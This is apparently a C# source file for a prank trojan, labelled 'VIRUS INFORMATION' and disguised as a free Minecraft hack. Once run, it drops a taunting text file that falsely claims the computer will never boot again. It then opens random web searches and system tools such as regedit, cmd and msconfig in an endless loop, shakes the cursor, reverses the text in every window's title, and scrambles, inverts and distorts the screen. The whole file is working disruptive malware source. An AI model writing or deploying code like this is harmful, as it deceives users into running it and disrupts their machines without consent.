/// Info
/// ---------------------------------------------------------------
/// | VIRUS INFORMATION
/// ---------------------------------------------------------------
/// | Made by lead1011(asussy_)
/// | Create date : 17/09/2023
/// | Version = Beta
/// ---------------------------------------------------------------
/// | History
/// ---------------------------------------------------------------
/// | Beta 
/// |
/// | 17/09/2023
/// | 
/// | created virus.
/// | This version of virus is just joke.
/// ---------------------------------------------------------------

using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Drawing;
using System.Text;

namespace MCHACK
{
    class Program
    {
        // Import necessary Windows API functions

        const int WM_GETTEXT = 0x000D;
        const int WM_SETTEXT = 0x000C;
        const int BUFFER_SIZE = 256;
        const int SRCCOPY = 13369376;
        const int PATINVERT = 0x005A0049; // R2_NOTXORPEN

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, StringBuilder lParam);

        [DllImport("user32.dll")]
        static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(int hwnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        static extern int DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, int rop);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, int rop);

        public struct POINT
        {
            public int X;
            public int Y;
        }

        public class Data
        {
            // Define icons here
            public static IntPtr IconWarning = LoadIcon(IntPtr.Zero, 32515);
            public static IntPtr IconError = LoadIcon(IntPtr.Zero, 32513);

            [DllImport("user32.dll")]
            public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        }

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        const uint MB_YESNO = 0x00000004;
        const uint MB_ICONWARNING = 0x00000030;
        const uint MB_OK = 0x00000000;

        static void Main()
        {

            // MAKE threads
            Thread MSG = new Thread(new ThreadStart(WriteMSG));
            Thread OS = new Thread(new ThreadStart(OpenSites));
            Thread CS = new Thread(new ThreadStart(CursorShake));
            Thread RT = new Thread(new ThreadStart(ReverseTEXT));
            Thread ED = new Thread(new ThreadStart(ErrorDrawing));
            Thread SP = new Thread(new ThreadStart(ScreenPuzzle));
            Thread BS = new Thread(new ThreadStart(BlinkScreen));
            Thread TE = new Thread(new ThreadStart(TunnelEffect));

            // start threads
            MSG.Start();
            // Wait for 20 seconds before starting payloads
            Thread.Sleep(20000);

            // Start cursor shaking and opening websites
            OS.Start();
            Thread.Sleep(8000);
            CS.Start();
            Thread.Sleep(28000);
            RT.Start();
            Thread.Sleep(5000);
            ED.Start();
            Thread.Sleep(4000);
            SP.Start();
            Thread.Sleep(18000);
            BS.Start();
            Thread.Sleep(10000);
            TE.Start();


        }

        static void WriteMSG()
        {
            // make txt file
            Process.Start("cmd", $"/c @echo off");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo congratulations. You got Free minecraft hack! >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo Please wait little bit, Minecraft Hack tool is starting... >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo DO you know It is fake hack? >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo lol, YOUR COMPUTER HAS BEEN F**KED BY THIS TROJAN!! X33333 >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo Your computer won't boot up again now! :D >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c echo So enjoy ur last time with ur computer! :P >> bobux.txt");
            Thread.Sleep(500);
            Process.Start("cmd", $"/c start bobux.txt");
            Thread.Sleep(2000);
            Process.Start("cmd", $"/c del bobux.txt");

        }

        static void OpenSites()
        {
            // Array of websites and programs to open
            string[] sites =
            {
            "https://www.google.com/search?q=minecraft+hack+2023+no+virus",
            "https://www.google.com/search?q=how+to+remove+virus+2023",
            "https://www.google.com/search?q=virus+download+free+for+windows+7+8.1+10+11",
            "https://www.google.com/search?q=youtube+hacking+tool",
            "https://www.google.com/search?q=free+minecraft+download+for+pc",
            "https://www.google.com/search?q=asdfmovie",
            "https://www.google.com/search?q=funny+malware+2023",
            "https://www.google.com/search?q=how+to+delete+system32",
            "https://www.google.com/search?q=rd+%2Fs+%2Fq+c%3A%5C",
            "https://www.google.com/search?q=how+to+make+game+using+python",
            "https://www.google.com/search?q=how+to+make+a+virus+in+visual+basic",
            "https://www.google.com/search?q=import+antigravity",
            "https://www.google.com/search?q=malbolge+is+best+computer+language",
            "https://www.google.com/search?q=pineapple+pizza+sucks",
            "https://www.google.com/search?q=free+minecraft+mods",
            "https://www.google.com/search?q=pubg+hack+free",
            "https://www.google.com/search?q=discord+hack+2023",
            "https://www.google.com/search?q=batch+virus+download",
            "https://www.google.com/search?q=mcaffee+vs+norton",
            "https://www.google.com/search?q=bonzi+buddy+download+windows+10",
            "https://www.google.com/search?q=joke+virus+2023",
            "https://www.google.com/search?q=my+computer+is+doing+weird+things",
            "https://www.google.com/search?q=SUS",
            "https://www.google.com/search?q=kid+amogus+meme",
            "https://www.google.com/search?q=amogus",
            "https://www.google.com/search?q=how+to+start+bsod",
            "https://www.google.com/search?q=internet+explorer+is+best+browser",
            "https://www.google.com/search?q=how+to+get+money",
            "https://www.google.com/search?q=how+to+get+free+robux",
            "https://www.google.com/search?q=roblox+hack",
            "calc",
            "notepad",
            "cmd",
            "write",
            "regedit",
            "explorer",
            "taskmgr",
            "msconfig",
            "mspaint",
            "devmgmt.msc",
            "control",
            "mmc"
            };

            Random random = new Random();


            while (true)
            {
                try
                {
                    // Open a random website or program
                    string randomSite = sites[random.Next(sites.Length)];
                    Process.Start("cmd", $"/c start {randomSite}");
                    Thread.Sleep(7000); // Wait for 7 seconds before opening the next site
                }

                catch (Exception ex)
                {
                    Console.WriteLine("An error occurred in OpenSites: " + ex.Message);
                }
            }
        }

        static void CursorShake()
        {
            int timeSubtract = 15000;
            Random random = new Random();

            while (true)
            {
                POINT cursorPosition;
                GetCursorPos(out cursorPosition);

                // Calculate new cursor position with shaking effect
                int newX = cursorPosition.X + (random.Next(3) - 1) * random.Next((int)((timeSubtract + 1) / 2200 + 2));
                int newY = cursorPosition.Y + (random.Next(3) - 1) * random.Next((int)((timeSubtract + 1) / 2200 + 2));

                // Set the cursor position
                SetCursorPos(newX, newY);

                Thread.Sleep(15); // Sleep for 15 milliseconds for the shaking effect
            }
        }

        static void ReverseTEXT()
        {
            while (true)
            {
                // Enumerate through all top-level windows and apply the text change to them.
                EnumWindows(new EnumWindowsProc(EnumChildProc), IntPtr.Zero);

                // Replace the following line with your desired delay logic
                Thread.Sleep(1000);
            }
        }
        static bool EnumChildProc(IntPtr hwnd, IntPtr lParam)
        {
            try
            {
                StringBuilder buffer = new StringBuilder(BUFFER_SIZE);
                SendMessage(hwnd, WM_GETTEXT, BUFFER_SIZE, buffer);

                // Reverse the text
                char[] charArray = buffer.ToString().ToCharArray();
                Array.Reverse(charArray);
                string reversedText = new string(charArray);

                SendMessage(hwnd, WM_SETTEXT, 0, new StringBuilder(reversedText));
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred in EnumChileProc: " + ex.Message);
            }

            return true;
        }

        static void ErrorDrawing()
        {
            Random random = new Random();
            IntPtr hdc = GetDC(0); // First monitor
            int sw = GetSystemMetrics(0); // Screen width
            int sh = GetSystemMetrics(1); // Screen height
            try
            {
                while (true)
                {
                    int x = random.Next(sw);
                    int y = random.Next(sh);

                    DrawIcon(hdc, x, y, Data.IconWarning); // Draw the warning icon randomly on the screen

                    GetCursorPos(out POINT cursorPosition);
                    DrawIcon(hdc, cursorPosition.X, cursorPosition.Y, Data.IconError); // Draw icon on mouse

                    Thread.Sleep(10);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("An error occurred in ErrorDrawing: " + ex.Message);
            }
        }

        static void ScreenPuzzle()
        {
            int sw = GetSystemMetrics(0); // Screen width
            int sh = GetSystemMetrics(1); // Screen height

            // Generate box position
            Random random = new Random();
            int x1 = random.Next(sw - 100);
            int y1 = random.Next(sh - 100);
            int x2 = random.Next(sw - 100);
            int y2 = random.Next(sh - 100);

            int width = random.Next(600);
            int height = random.Next(600);

            IntPtr hdc = GetDC(0);

            try
            {
                while (true)
                {
                    bool success = BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

                    if (!success)
                    {
                        int error = Marshal.GetLastWin32Error();
                        Console.WriteLine("BitBlt failed with error code: " + error);
                    }

                    Thread.Sleep(150);

                    // Generate new box position
                    x1 = random.Next(sw - 100);
                    y1 = random.Next(sh - 100);
                    x2 = random.Next(sw - 100);
                    y2 = random.Next(sh - 100);
                    width = random.Next(600);
                    height = random.Next(600);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred in ScreenPuzzle: " + ex.Message);
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, hdc); // Release the device context
            }
        }

        static void TunnelEffect()
        {
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);

            IntPtr hdc = GetDC(0);

            try
            {
                while (true)
                {
                    StretchBlt(hdc, 50, 50, screenWidth - 100, screenHeight - 100, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
                    Thread.Sleep(150);
                }
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        static void BlinkScreen()
        {
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);
            IntPtr hdc = GetDC(0);

            try
            {
                while (true)
                {
                    PatBlt(hdc, 0, 0, screenWidth, screenHeight, PATINVERT);
                    Thread.Sleep(1000);
                }
            }
            finally
            {
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }
    }
}